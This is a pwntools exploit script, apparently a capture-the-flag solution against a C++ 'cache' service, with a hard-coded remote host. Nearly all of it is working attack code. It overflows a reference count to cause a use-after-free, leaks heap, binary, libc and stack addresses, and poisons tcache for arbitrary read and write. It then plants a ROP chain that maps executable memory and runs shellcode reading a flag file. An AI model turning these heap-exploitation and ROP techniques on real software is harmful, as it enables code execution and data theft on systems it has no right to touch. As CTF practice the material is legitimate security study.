#!/usr/bin/env python3

import itertools
import os

from pwn import *

the_binary = "./cache"
# the_binary = "./cache.dbg"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc-2.31.so", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("3.139.106.4", 27025)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
elif args.GDB:
    io = gdb.debug(the_binary, """
        continue
    """)
else:
    io = process(
        ["./ld-2.31.so", the_binary],
        env={"LD_PRELOAD": os.path.abspath("./libc-2.31.so")}
    )

# Program I/O wrappers.
def create(name, size):
    io.sendlineafter("> ", "1")
    io.sendlineafter("Cache name: ", name)
    io.sendlineafter("Size: ", str(size));

def read(name, offset, count):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Cache name: ", name)
    io.sendlineafter("Offset: ", str(offset))
    io.sendlineafter("Count: ", str(count))

def write(name, data, offset, count=None):
    if count is None:
        count = len(data)

    io.sendlineafter("> ", "3")
    io.sendlineafter("Cache name: ", name)
    io.sendlineafter("Offset: ", str(offset))
    io.sendlineafter("Count: ", str(count))
    io.sendafter("Data: ", data)

def erase(name):
    io.sendlineafter("> ", "4")
    io.sendlineafter("Cache name: ", name)

def duplicate(src_name, dst_name):
    io.sendlineafter("> ", "5")
    io.sendlineafter("Source cache name: ", src_name)
    io.sendlineafter("New cache name: ", dst_name)

names = list("".join(x) for x in itertools.product(string.ascii_uppercase, repeat=2))

create("A", 0x200)
write("A", "one"*0x60, offset=0)

# Overflow A's refCount.
for i in range(0xff+1):
    duplicate("A", names[i])

# Ref count has overflown around to 1 at this point, so erasing the original
# cache will cause all of the duplicates to point to a freed cache.
erase("A")

# Now reading the freed memory will also leak some pointers.
read("BB", 0, 0x200)
raw_leak = io.recvuntil("\n*******************************", drop=True)
print(hexdump(raw_leak))
heap_leak = u64(raw_leak[0x80:0x88])
heap_base = heap_leak - 0x11eb0

log.success("Heap base: %#x" % heap_base)

# Now we can use our relative write to overwrite tcache list heads
heap_BB_addr = heap_base + 0x10
fake_tcache_chunk = (
    p64(0) +
    p64(0x20) +
    p64(0)
)
write("BB", p64(heap_BB_addr + 0x10), offset=0)
write("BB", fake_tcache_chunk, offset=0x10)

# Make the next 0x20 chunk allocated come from our writable address.
write("BB", p64(heap_BB_addr), offset=0x80)

create("fake", 0x10)
# Edit size field of "fake" cache.
write("BB", p64(0xffffffffffffffff), offset=0x10)
fake_cache_base = heap_base + 0x20

log.info("Fake cache base: %#x" % fake_cache_base)

# We now have a corrupted cache with size of max unsigned long. To avoid
# overly-long offsets (which can cause heap allocations for long strings),
# we implement our primitives by updating the base address of the
# std::unique_ptr.
def arb_write(where, what):
    write("BB", p64(where), offset=0x8)
    write("fake", what, offset=0)

def arb_read(where, size=8):
    write("BB", p64(where), offset=0x8)
    read("fake", offset=0, count=size)
    return io.recvuntil("\n*******************************", drop=True)

# Now use arbitrary read to leak a pointer into the binary.
pie_leak = u64(arb_read(heap_base + 0x12630))
elf.address = pie_leak - 0xa370
log.info("Binary PIE leak: %#x" % pie_leak)
log.info("ELF base: %#x" % elf.address)

# Now get a libc leak through the GOT.
strtoull_leak = u64(arb_read(elf.got.strtoull))
libc.address = strtoull_leak - libc.sym.strtoull
log.info("libc base: %#x" % libc.address)

# Now get a stack leak from libc.
# stack_leak = u64(arb_read(libc.address + 0x1ec440))
stack_leak = u64(arb_read(libc.sym.environ))
log.info("Stack leak: %#x" % stack_leak)

pop_rax = p64(libc.address + 0x000000000004a550)
pop_rdi = p64(libc.address + 0x0000000000026b72)
pop_rsi = p64(libc.address + 0x0000000000027529)
pop_rdx_pop_rbx = p64(libc.address + 0x0000000000162866)
syscall = p64(libc.address + 0x0000000000066229)
ret = p64(libc.address + 0x0000000000025679)
jmp_rax = p64(libc.address + 0x0000000000026e91)

mov_r9_rsi_jmp_rax = p64(libc.address + 0x0000000000081738)
mov_r10_rdx_jmp_rax = p64(libc.address + 0x000000000007b0cb)
mov_r8_rax_mov_rax_r8_pop_rbx = p64(libc.address + 0x0000000000156298)

mmap_fixed_addr = 0x7fe7a1e8f000
flag_buf = mmap_fixed_addr + 0x200
flag_len = 0x40

sc = ""
sc += shellcraft.echo("this is running\n")
sc += shellcraft.open("/home/cache/flag")
sc += shellcraft.read("rax", flag_buf, flag_len)
sc += shellcraft.write(1, flag_buf, flag_len)
sc = asm(sc)

rop = b""
if not args.REMOTE:
    rop += b"B"*8
# mmap RWX segment
rop += pop_rdi
rop += p64(mmap_fixed_addr)
rop += pop_rax
rop += ret
rop += pop_rdx_pop_rbx
rop += p64(constants.MAP_PRIVATE | constants.MAP_FIXED | constants.MAP_ANON)
rop += p64(0xcafebabedeadbeef)
rop += mov_r10_rdx_jmp_rax
rop += pop_rsi
rop += p64(0)
rop += mov_r9_rsi_jmp_rax
rop += pop_rax
rop += p64(0)
rop += mov_r8_rax_mov_rax_r8_pop_rbx
rop += p64(0xcafebabedeadbeef)
rop += pop_rsi
rop += p64(0x1000)
rop += pop_rdx_pop_rbx
rop += p64(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)
rop += p64(0xcafebabedeadbeef)
rop += pop_rax
rop += p64(constants.SYS_mmap)
rop += syscall
# read into mapped segment
rop += pop_rdi
rop += p64(0)
rop += pop_rsi
rop += p64(mmap_fixed_addr)
rop += pop_rdx_pop_rbx
rop += p64(len(sc))
rop += p64(0xcafebabedeadbeef)
rop += pop_rax
rop += p64(constants.SYS_read)
rop += syscall
# jump to shellcode
rop += pop_rax
rop += p64(mmap_fixed_addr)
rop += jmp_rax

# Now we use our arbitrary write to write a ROP chain into the stack of
# handleWrite, which will execute once the flow attempts to return out of
# handleWrite.
log.info("Writing ROP chain of length %i" % len(rop))
handle_write_stack = stack_leak - 0x110
log.info("Writing to stack buffer at %#x" % handle_write_stack)

arb_write(handle_write_stack, rop)

log.info("Sending shellcode payload of length %i" % len(sc))
io.send(sc)
io.interactive()
